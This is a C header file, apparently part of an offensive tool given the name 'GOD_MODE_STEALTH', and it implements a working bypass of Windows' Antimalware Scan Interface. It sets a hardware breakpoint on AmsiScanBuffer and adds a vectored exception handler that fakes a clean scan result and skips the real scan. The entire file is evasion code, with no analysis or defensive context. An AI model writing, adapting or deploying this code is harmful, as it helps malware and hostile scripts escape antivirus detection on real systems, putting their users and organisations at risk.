#ifndef GOD_MODE_STEALTH_H
#define GOD_MODE_STEALTH_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"

typedef struct _HWBP_STATE {
    PVOID TargetAddress;
    DWORD DrIndex;
    DWORD DrControlMask;
    BOOL  IsActive;
} HWBP_STATE, *PHWBP_STATE;

static HWBP_STATE g_HwbpState = {0};
static PVOID g_pAmsiScanBuffer = NULL;

static LONG CALLBACK HardwareBreakpointHandler(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
    PEXCEPTION_RECORD pRecord = ExceptionInfo->ExceptionRecord;
    PCONTEXT pCtx = ExceptionInfo->ContextRecord;
    
    if (pRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) return EXCEPTION_CONTINUE_SEARCH;
    if (pRecord->ExceptionAddress != g_HwbpState.TargetAddress) return EXCEPTION_CONTINUE_SEARCH;
    
    DWORD bpTriggered = (pCtx->Dr6 & 0x0F);
    if (!(bpTriggered & (1 << g_HwbpState.DrIndex))) return EXCEPTION_CONTINUE_SEARCH;
    
    PDWORD pResult = (PDWORD)(pCtx->Rsp + 0x30);
    if (pResult && !IsBadWritePtr(pResult, sizeof(DWORD))) {
        *pResult = 0; // AMSI_RESULT_CLEAN
    }
    
    pCtx->Rax = 0; // S_OK
    
    PBYTE pFunc = (PBYTE)g_pAmsiScanBuffer;
    if (pFunc && !IsBadReadPtr(pFunc, 0x200)) {
        for (SIZE_T i = 0; i < 0x200; i++) {
            if (pFunc[i] == 0xC3) { pCtx->Rip = (DWORD64)(pFunc + i + 1); break; }
            if (pFunc[i] == 0xC2) { pCtx->Rip = (DWORD64)(pFunc + i + 3); break; }
        }
    }
    
    pCtx->Dr0 = pCtx->Dr1 = pCtx->Dr2 = pCtx->Dr3 = 0;
    pCtx->Dr7 = 0x400; 
    pCtx->Dr6 = 0;
    g_HwbpState.IsActive = FALSE;
    
    return EXCEPTION_CONTINUE_EXECUTION;
}

static BOOL InstallHWBP(_In_ PVOID targetAddress, _In_ DWORD drIndex) {
    if (!targetAddress || drIndex > 3) return FALSE;
    g_HwbpState.TargetAddress = targetAddress;
    g_HwbpState.DrIndex = drIndex;
    g_HwbpState.IsActive = TRUE;
    g_pAmsiScanBuffer = targetAddress;
    if (!AddVectoredExceptionHandler(1, HardwareBreakpointHandler)) return FALSE;
    CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) return FALSE;
    switch (drIndex) {
        case 0: ctx.Dr0 = (DWORD64)targetAddress; break;
        case 1: ctx.Dr1 = (DWORD64)targetAddress; break;
        case 2: ctx.Dr2 = (DWORD64)targetAddress; break;
        case 3: ctx.Dr3 = (DWORD64)targetAddress; break;
    }
    ctx.Dr7 |= (1 << (drIndex * 2));
    ctx.Dr7 &= ~(3 << (16 + drIndex * 4));
    ctx.Dr7 &= ~(3 << (18 + drIndex * 4));
    return SetThreadContext(hThread, &ctx);
}

static BOOL BypassAMSI_HWBP() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;
    PVOID pAmsiScanBuffer = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;
    return InstallHWBP(pAmsiScanBuffer, 0);
}

#endif
